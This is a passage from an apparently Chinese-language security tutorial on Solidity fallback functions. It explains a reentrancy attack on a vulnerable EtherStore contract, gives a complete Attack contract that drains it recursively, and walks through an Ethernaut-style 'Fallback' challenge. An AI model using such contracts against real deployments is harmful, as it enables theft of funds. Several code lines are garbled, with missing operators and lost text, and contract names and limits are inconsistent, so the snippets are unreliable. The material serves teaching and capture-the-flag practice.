        mapping(address => uint256) public lastWithdrawTime;
        mapping(address => uint256) public balances;
        function depositFunds() public payable {
            balances[msg.sender] += msg.value;
        }
        //传入取钱金额
        function withdrawFunds (uint256 _weiToWithdraw) public {
            // 需要用户金额大于所需提取金额、需要提取金额不能超过限度、需要距离上次提取时间大于一周
            require(balances[msg.sender] >= _weiToWithdraw);
            require(_weiToWithdraw = lastWithdrawTime[msg.sender] + 1 days);
           //使用call函数执行转账操作，向msg.sender转账_weiToWithdraw以太币
            require(msg.sender.call.value(_weiToWithdraw)());
            balances[msg.sender] -= _weiToWithdraw;
            lastWithdrawTime[msg.sender] = now;
        }
     }
该合约有两个公共职能。`depositFunds()` 和 `withdrawFunds()`。该
`depositFunds()`功能只是增加发件人余额。该 withdrawFunds() 功能允许发件人指定要取出的以太币的数量。如果所要求的退出金额小于
1Ether 并且在一天内发生取出，它才会成功。
我们现在来分析一下这个合约。在介绍攻击方法前，我们需要看一下一些基础概念：
当你通过`addr.call.value()()`的方式发送ether时，和`send()`一样，fallback函数会被调用，但是传递给`fallback`函数可用的气是当前剩余的所有气（可能会是很多），这时`fallback`函数可以做的事情就有很多（如写`storage`、再次调用新的智能合约等等）。一个精心设计的用于做恶的`fallback`可以做出很多危害系统的事情。
而对于一个指定合约地址的 call 调用，可以调用该合约下的任意函数。在这个例子中，会调用攻击合约的`fallback()`函数。
而我们在这里放入攻击合约：
    contract Attack {
      EtherStore public etherStore;
      // 初始化合约代码
      constructor(address _etherStoreAddress) {
          etherStore = EtherStore(_etherStoreAddress);
      }
      function attackStore() public payable {
          // 调用存钱函数，使改账户在银行中存部分钱
          etherStore.depositFunds.value(1 ether)();
          // 攻击重点所在
          etherStore.withdrawFunds(1 ether);
      }
      // fallback 函数
      function () payable {
          if (etherStore.balance > 1 ether) {
              etherStore.withdrawFunds(1 ether);
          }
      }
    }
下面我们来具体的分析下攻击是如何产生的。
  * 首先，我们需要初始化BankStore合约，传入参数并实例化`etherStore`。
  * 之后我们在攻击合约界面中调用`attackStore()`。首先我们需要在`BankStore`合约变量中存入1个以太币（因为只有存钱了才能取钱）。
  * 然后调用`therStore.withdrawFunds(1 ether)`函数，此函数用于调用`BankStore`合约中的取钱函数。而在本函数中我们能够看到：
    // 需要用户金额大于所需提取金额、需要提取金额不能超过限度、需要距离上次提取时间大于一周
            require(balances[msg.sender] >= _weiToWithdraw);
            require(_weiToWithdraw = lastWithdrawTime[msg.sender] + 1 days);
  * 而我们存过部分钱（有可能之前也存过许多钱，所以我们可以假设这里有100Eth）、而且我们只取了1eth，所以也满足第二个条件、而且我们这是第一次调用，所以没有超过一天，所以也满足第三个条件。
  * 然而根据我们上面介绍，当我们调用`BankStore`合约中`withdrawFunds()`函数时，会执行`msg.sender.call.value(_weiToWithdraw)()`。而我们知道，`call()`函数调用的时候会运行调用函数方（攻击者合约）的`fallback()`函数。即
    unction () payable {
          if (etherStore.balance > 1 ether) {
              etherStore.withdrawFunds(1 ether);
          }
      }
  * 此时又会执行`etherStore.withdrawFunds(1 ether);`。而我们发现其三个`require()`仍然满足（因为它把修改条件放到了msg.sender.call.value(_weiToWithdraw)()后面）：
  * 之后子子孙孙无穷尽。一直递归调用转账，从而达到了绕过那些判断条件的情况。
  * 停止时要看：回调函数中的`if (etherStore.balance > 1 ether)`。当你的合约中的余额不足1以太币的时候，那就停止递归调用了。emmmm可怕
**最终的结果是，攻击者只用一笔交易，便立即从 BankStore 合约中取出了（除去 1 个 Ether 以外）所有的 Ether。**
#### 2 竞赛题目
下面，我们看一道竞赛题目：
    pragma solidity ^0.4.18;
    import 'zeppelin-solidity/contracts/ownership/Ownable.sol';
    contract Fallback is Ownable {
      mapping(address => uint) public contributions;
      function Fallback() public {
        contributions[msg.sender] = 1000 * (1 ether);
      }
      function contribute() public payable {
        require(msg.value  contributions[owner]) {
          owner = msg.sender;
        }
      }
      function getContribution() public view returns (uint) {
        return contributions[msg.sender];
      }
      function withdraw() public onlyOwner {
        owner.transfer(this.balance);
      }
      function() payable public {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
      }
    }
大致分析题目后我们得知，这个题目的目的有两个：
即让我们成为合约的owner并且将账户的金额转账为0。
针对合约内容我们分析：想要成为owner，我们能够发现在底部有个函数：
    function() payable public {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
      }
这个函数就是我们文章中一直提及的`fallback()`函数。所以我们调用send函数进行转账就可以调用。但是在调用之前，我们需要领自己的合约中有钱才行。
    function contribute() public payable {
        require(msg.value  contributions[owner]) {
          owner = msg.sender;
        }
      }
在这个函数中我们知道，我们可以通过这个函数不断的取钱，并且当  
`contributions[msg.sender] >
contributions[owner]`（自己的钱大于系统的钱时）就可以成为合约owner。然而，上面限制了我们转账的次数。我们只可以一次转账0.001个以太币。所以要很久才能够满足这个条件，所以放弃。
于是我们考虑方法一。所以我们首先先给自己的账户中转点钱进去：
之后我们确认Tx。
得到：
此时我们查看我们的账户钱财：
里面有1个钱币。
之后我们进行转账：
在转账函数调用后，会自动调用fallback函数。此时我们查看合约的owner：
成功的改变了owner为自己。之后我们调用转账函数：
    function withdraw() public onlyOwner {
        owner.transfer(this.balance);
      }
之后我们将合约提交，能够看到我们已经满足题目要求。
### 三、参考链接
  * 
  * 
  * 
  * 
**本稿为原创稿件，转载请标明出处。谢谢。**